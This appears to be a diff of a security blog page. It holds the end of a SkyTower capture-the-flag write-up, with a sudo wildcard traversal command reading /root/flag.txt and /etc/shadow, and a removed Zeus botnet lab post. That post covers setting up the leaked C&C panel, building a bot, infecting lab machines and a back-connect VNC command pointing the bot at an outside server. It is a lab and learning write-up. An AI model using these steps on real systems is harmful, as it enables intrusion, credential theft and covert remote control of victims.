+<p>This user may execute some commands as root using <code>sudo</code>. <code>sudo</code> allows you to specify what those commands are, if not all. There was one problem with this configuration though. <code>*</code> is a wildcard character, and as such, anything after <code>cat /accounts/</code> may also be run. This means that things like <code>sudo cat /accounts/../../etc/shadow</code> will work as the wildcard allows us to do a form of directory traversal.</p>
+
+<h2>pwnd</h2>
+
+<p>So, to complete SkyTower:</p>
+
+<figure class='code'><figcaption><span>SkyTower pwn</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>sara@SkyTower:~<span class="nv">$ </span>sudo cat /accounts/../../root/flag.txt
+</span><span class='line'>Congratz, have a cold one to celebrate!
+</span><span class='line'>root password is theskytower
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thanks to <a href="https://twitter.com/telspacesystems">@telspacesystems</a> for the fun experience. I learnt something so for this was totally worth it!</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1179,377 +1610,6 @@ Looking at the server, we see that the message is received:</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/">Zeus - My Adventure with a Infamous Bot</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-09-23T14:21:00+02:00" pubdate data-updated="true">Sep 23<sup>rd</sup>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h6>var disclaimer = require(&lsquo;standard_disclaimer.js&rsquo;);</h6>
-
-<p><strong>NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET AND A ANGRY NATIVE WITH A BIG STICK &ndash; ALONE</strong></p>
-
-<h3>Bots for the masses.</h3>
-
-<p>Recently at a conference that I attended, I sat in a class that was talking about Botnets and general &lsquo;How Easy They Are&rsquo; related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not <strong>100%</strong> aware of how ( and I dare say this lightly ) <em>easy</em> they have it. The technical competency of the adversary really doesn&rsquo;t have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator.</p>
-
-<h3>So, botnet?</h3>
-
-<p>In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the <a href="http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)">Zeus botnet</a>. Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra <em>features</em> that you&rsquo;d like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.</p>
-
-<p>So for $700, you can buy a relatively easy to setup piece of software that would allow you to <em>steal</em> credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article <a href="http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)">here</a> does a excellent job to describe the process in a image:</p>
-
-<p><img src="http://upload.wikimedia.org/wikipedia/en/2/2d/FBI_Fraud_Scheme_Zeus_Trojan.jpg"></p>
-
-<h3>The Zeus Bot Architecture</h3>
-
-<p>The Zeus bot client side software is a windows only piece of malware. Typically infection would occur via a <a href="http://en.wikipedia.org/wiki/Drive-by_download">drive-by download</a> (which is the scariest and possibly most stealthy form of infection), or via other means such as facebook posts, phishing sites etc, enticing the user to run an arbitrary executable. Of course, infection is not limited to these methods. Simply getting access to a computer, plugging in your thumbdrive and running the bot software is a completely valid form of infection.</p>
-
-<p>Once infection is successful, the client runs silently on the victim PC, masking itself as much as possible. The client would have a time configured that tells it how often it should update the Command and Control server with new collected information, as well as dynamic configuration updates, new commands it should run and keep-alive check-ins.</p>
-
-<h3>Zeus Source Leaked</h3>
-
-<p>The full Zeus bot sources <a href="https://www.csis.dk/en/csis/blog/3229/">leaked</a> around March 2011, and a Github repo of it was made <a href="https://github.com/Visgean/Zeus">here</a>. This allowed any one in the public to dissect, inspect and test the Malware. This was probably not a good thing for the malware authors&#8217; business :). However, now, anyone is able to grab the sources, modify it as required and use. It leads to the possibility of even more sophistication in a already successful botnet, such as adding peer-to-peer communications with C&amp;C servers instead of relying on HTTP as can be seen in <a href="http://www.cert.pl/PDF/2013-06-p2p-rap_en.pdf">this</a> excellent analysis by <a href="https://twitter.com/CERT_Polska_en">@CERT_Polska_en</a>.</p>
-
-<h3>LAB Time!</h3>
-
-<p>Now that we have the full sources, I decided it&rsquo;s time to setup a LAB to configure and play with this bot.</p>
-
-<p>I have a KVM Server at my disposal, and figured it will be a good idea to use that. The basic idea of the lab was to have a simulated internet network, a firewall, and a client network that makes use of this &ldquo;Fake Internet&rdquo;. I created 2 isolated networks, configured a set of CentOS 6, and Windows XP clients and a Server 2008 R2 Server.</p>
-
-<p>In short, the lab was going to look something like this:</p>
-
-<figure class='code'><figcaption><span>Internal Zeus LAB</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>                         Virtual Machine Management Interface
-</span><span class='line'>                         +-----------------------------------&gt;
-</span><span class='line'>                                   <span class="p">|</span>
-</span><span class='line'>                                   <span class="p">|</span>
-</span><span class='line'>                                   <span class="p">|</span>
-</span><span class='line'>                              +----+---------+
-</span><span class='line'>                              <span class="p">|</span>              <span class="p">|</span>
-</span><span class='line'>                  +-----------+  Firewall    +-----------+
-</span><span class='line'>                  <span class="p">|</span>           <span class="p">|</span>              <span class="p">|</span>           <span class="p">|</span>
-</span><span class='line'>                  <span class="p">|</span>           +--------------+           <span class="p">|</span>
-</span><span class='line'>                  <span class="p">|</span>                                      <span class="p">|</span>                 +----------+
-</span><span class='line'>                  <span class="p">|</span>                  ^                   <span class="p">|</span>              +--<span class="p">|</span> Victim A <span class="p">|</span>
-</span><span class='line'>          +---------------+          <span class="p">|</span>           +----------------+     <span class="p">|</span>  +----------+
-</span><span class='line'>          <span class="p">|</span>               <span class="p">|</span>          <span class="p">|</span>           <span class="p">|</span>                <span class="p">|</span>     <span class="p">|</span>
-</span><span class='line'>          <span class="p">|</span> Fake Internet <span class="p">|</span>          +           <span class="p">|</span>   Fake LAN     +-----+  +----------+
-</span><span class='line'>          <span class="p">|</span>               <span class="p">|</span>                      <span class="p">|</span>                <span class="p">|</span>     +--+ Victim B <span class="p">|</span>
-</span><span class='line'>          +------+--------+   NAT Towards Fake   +----------------+        +----------+
-</span><span class='line'>                 <span class="p">|</span>            Internet Interface
-</span><span class='line'>                 <span class="p">|</span>
-</span><span class='line'>        +--------+--------+--------------------+----------------+
-</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                <span class="p">|</span>
-</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                <span class="p">|</span>
-</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                +
-</span><span class='line'> +------+-----+     +-----+------+      +------+-------+     +-----------------+
-</span><span class='line'> <span class="p">|</span>            <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span>                 <span class="p">|</span>
-</span><span class='line'> <span class="p">|</span> Zeus Bot   <span class="p">|</span>     <span class="p">|</span> Zeus Web   <span class="p">|</span>      <span class="p">|</span> Random Victim<span class="p">|</span>     <span class="p">|</span> Compromised     <span class="p">|</span>
-</span><span class='line'> <span class="p">|</span> Herder /   <span class="p">|</span>     <span class="p">|</span> based C<span class="p">&amp;</span>C  <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span> Web Server      <span class="p">|</span>
-</span><span class='line'> <span class="p">|</span> Controller <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span>                 <span class="p">|</span>
-</span><span class='line'> +------------+     +------------+      +--------------+     +-----------------+
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h3>The Configuration</h3>
-
-<h4>Command &amp; Control</h4>
-
-<p>I figured I&rsquo;d start by checking out the code from the <a href="https://github.com/Visgean/Zeus/">git</a> repo onto the server I would use as the command and control server. So, off I went and <code>git clone https://github.com/Visgean/Zeus.git</code>&rsquo;d the Zeus code into a local directory of my C&amp;C server.</p>
-
-<p>The folder structure of the directory <code>output</code> that is of interest, on disk, looked something like this:</p>
-
-<figure class='code'><figcaption><span>Zeus Sources FOlder Structure</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>Zeus/output
-</span><span class='line'>├── builder
-</span><span class='line'>├── other
-</span><span class='line'>├── server
-</span><span class='line'>└── server<span class="o">[</span>php<span class="o">]</span>
-</span><span class='line'>    ├── install
-</span><span class='line'>    ├── system
-</span><span class='line'>    └── theme
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We can see there is a <code>server[php]</code> directory, which is rather obvious that this is the web interface code. Quick inspection of the sources revealed that the common directory index <code>index.php</code> is in fact empty. So, should someone stumble upon the C&amp;C directory, a blank page will be displayed to the user.</p>
-
-<p>Two other files also exist in the php server root, namely <code>cp.php</code> and <code>gate.php</code>. <code>cp.php</code> is the user control panel to manage the bots, whereas <code>gate.php</code> is the script that all the bots will use to communicate with the C&amp;C. That being said, inspecting network traffic should reveal a lot of talking with <code>gate.php</code>. As a side note, the comments in the sources are in Russian, which makes for a interesting time with Google Translate to read them ;)</p>
-
-<p>So, I copied the sources for <code>server[php]</code> to a web folder <code>z/</code>, fixed up the SELinux contexts for them and tried to access the <code>cp.php</code> page. Bam, server error.</p>
-
-<figure class='code'><figcaption><span>Zeus cp.php mb_internal_encoding error</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>Mon Sep 23 10:57:45 2013<span class="o">]</span> <span class="o">[</span>error<span class="o">]</span> <span class="o">[</span>client 172.16.50.1<span class="o">]</span> PHP Fatal error:  Call to undefined <span class="k">function </span>mb_internal_encoding<span class="o">()</span> in /var/www/html/z/system/global.php on line 1
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It was pretty obvious I was missing <code>php-mbstring</code>, so I went and installed it and restarted Apache. Now, loading my <code>cp.php</code>, I was greeted with a polite message asking me how I am :D</p>
-
-<p><img src="http://i.imgur.com/cCgsLBk.png"></p>
-
-<h4>Installing the Command &amp; Control</h4>
-
-<p>I noticed a install folder in the obtained sources and browsed to <code>install/</code> and found a very nice, easy to understand installer:</p>
-
-<p><img src="http://i.imgur.com/e1fYvPG.png"></p>
-
-<p>Here I realized I needed to have a mysql server running, so I proceeded to install that too and create a database <code>cpdb</code> for the control panel. From here, it was literally a case of install and login. We now have a working Zeus command and control server. That really was not so hard was it? In fact, its worryingly easy.</p>
-
-<p><img src="http://i.imgur.com/La5zzZI.png"></p>
-
-<h4>Compiling the Bot</h4>
-
-<p>With that out of the way, the next step had to be to compile the Zeus bot binary with which we will be infecting the Lab of fake LAN clients. For this a Windows machine was required as the tools for this are all windows based. I fired up a Windows XP Virtual Machine, and grabbed a copy of the Zeus code from the Github repository again.</p>
-
-<p>Next, I browsed to the <code>output/builder/</code> folder again and opened the <code>config.txt</code> file in notepad. Here, I really had to set minimal options. One to specify the location of the <code>config.bin</code> and the others for the location of updated bot binaries and what URL the Command and Control server lives at. All pretty straight forward. I also had to set the <code>encryption_key</code>, which should correspond to the key used when we installed the server side PHP stuff earlier.</p>
-
-<p><img src="http://i.imgur.com/xQQeqQl.png"></p>
-
-<p>The next step was to <em>compile</em> the bot. While this may sound complex, it&rsquo;s not. In fact, 2 clicks, granted the config files syntax is correct, and you will have a working compiled exe to work with. The <strong>compiler</strong> interface looked like this:</p>
-
-<p><img src="http://i.imgur.com/f13Baez.png"></p>
-
-<p>1,2,3 done. We now have a <code>zeus-bot.exe</code>. The malware is now customized to speak to my Command &amp; Control server using my unique encryption key. Again, up until this point everything has been pretty easy and straight forward.</p>
-
-<h3>Skipping the creative parts &ndash; Infection.</h3>
-
-<p>From here the infection phase pretty much starts. Of course, the bot herder would need to test hes executables and ensure that they are in working order. There is no point in distributing malware that doesn&rsquo;t work eh. ;D With infection, as previously mentioned anything goes. From drive-by downloads to phishing to physical access to a server. If the machine can execute the bot executable, its job done.</p>
-
-<p>Sadly, I wanted to test the <a href="http://en.wikipedia.org/wiki/Blackhole_exploit_kit">Blackhole Exploit Kit</a>, but the resources on the net appear to be rather scarce. That and the fact that the available versions of it are encoded using a PHP encoder (IonCube), makes it a tad more difficult to get going. It was however interesting to see that the malware authors are limiting they software to IP&rsquo;s along with time restrictions the works. Just like something you&rsquo;d expect to see in commercial software.</p>
-
-<p>As I am kind of the only person using this network, there is no point in trying to fool me into getting the executable run. To make it easy for me to rerun it, I uploaded <code>zeus-bot.exe</code> and the encrypted <code>config.bin</code> to a fake <strong>compromised web server</strong>, ready for download.</p>
-
-<p>I opened Internet Explorer and browsed to the location of <code>zeus-bot.exe</code> and chose <strong>RUN</strong>. To the unsuspecting user, it will appear that nothing happened&hellip;</p>
-
-<h3>From the Bot Herders Perspective</h3>
-
-<p>Assuming the position of the evil bot herder now, I am able to see that I have a new bot connected to my Command &amp; Control server. We can see this in the interface, as well as based on the POST requests to <code>gate.php</code></p>
-
-<figure class='code'><figcaption><span>Apache Logs Extract for POST&#8217;s to gate.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:01 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:06 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:12 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:17 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:22 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:00 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:05 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:10 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:15 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:20 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:23 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:28 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:34 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:39 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:44 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:20 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:25 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:30 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:35 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:40 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:45 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:50 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:56 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:01 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:07 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:40 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:45 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:50 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:55 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We are also able to, using the control panel, see some more information based on the newly connected bot:</p>
-
-<p><img src="http://i.imgur.com/aKe4kJh.png"></p>
-
-<p>An interesting thing to note here. It appears that the Zeus bot opens up a socks port on the client machines. If the Command &amp; Control server is able to connect to this IP, and the socks port, then it will be able to pull a screenshot of the current state the client pc is in. This is an <em>almost live</em> image. On the client, we can see that the process <code>explorer.exe</code> is listening in port 35419. This is the same port that the web interface is reporting as the SOCKS port.</p>
-
-<p><img src="http://i.imgur.com/fiy0u2N.png"></p>
-
-<p>In the case of my lab setup, this SOCKS connection was not possible due to the fact that the client is reporting as connected from 172.16.50.2, which is the fake, natted public ip of the lab firewall. The firewall itself is most certainly not listening on that port so the connection would fail. Maybe if I port forwarded the connection back into the fake LAN it would have been able to connect but this I did not test.</p>
-
-<p>So, to test the screen-shotting features, I infected another client on the fake Internet, where the Command &amp; Control server <strong>will</strong> be able to connect to. The result?</p>
-
-<p><img src="http://i.imgur.com/GMqlVCM.png"></p>
-
-<p>There is <strong>no</strong> visual sign of this activity to the user. The user may be busy with some highly confidential work on hes workstation, unaware that an intruder is able to see what he is seeing. You know, like using that secret text file with all your passwords in it.</p>
-
-<h4>But thats not all</h4>
-
-<p>Just being able to <em>see</em> what the user sees is not really enough. No. You also have the ability to remotely VNC into the infected machine. By doing this, the attacker is able to remotely control your computer as you, with one difference, you won&rsquo;t know about it. So lets say he managed to successfully compromise your banking credentials. Instead of triggering alarms on the banks side that a login has just occurred on the other side of the globe, the attacker can now use <strong>your</strong> machine to steal <strong>your</strong> money. From the banks perspective this may appear like a perfectly legitimate transaction.</p>
-
-<p>So lets see how this VNC functionality works.</p>
-
-<h4>Execute the VNC BC Script</h4>
-
-<p>First, the attacker will have to prepare a back connect server and then, via a script, tell the bot to connect to this server so that he may access the botted machine. This architecture is pretty solid. The only thing really that would stop an attacker from succeeding in setting up this back connect is if the remote firewall was to block the port that the attacker has set up on the back connect server. However, things like port 80, or even 443 is almost always opened, so these will be prime candidates to use.</p>
-
-<p>In short, the setup will look something like this.</p>
-
-<figure class='code'><figcaption><span>Back Connect Server</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>   --------------------------&gt;        &lt;--------------------------------------------
-</span><span class='line'>   --------------------------&gt;        &lt;--------------------------------------------
-</span><span class='line'>
-</span><span class='line'>   +------------+      +-----------------------+  +--------------+   +------------------+
-</span><span class='line'>   <span class="p">|</span>  Attacker  +------&gt;  Back Connect Server  &lt;--+ LAN Firewall &lt;---+ Infected Machine <span class="p">|</span>
-</span><span class='line'>   +------------+      +-----------------------+  +--------------+   +------------------+
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The back connect server could be any host the attacker has access to and controls. This is also a great way for the attacker that wants to VNC to hide hes IP information. Should you on the infected machine realize what is going on, then you&rsquo;d only see the connection going out to the back connect server, and not the real attacker. The server executable is <code>zsbcs.exe</code> in the <code>output/server/</code> directory and is a windows only tool.</p>
-
-<p>Once the Back Connect Server is setup to listen on one port for new bots, and another for VNC client connections, the attacker would configure a script, instructing the clients where to connect. The script would look something like this:</p>
-
-<figure class='code'><figcaption><span>Back Connect Script</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bot_bc_add vnc 172.16.50.181 9000
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This tells the bot where to connect to wait for a VNC session.</p>
-
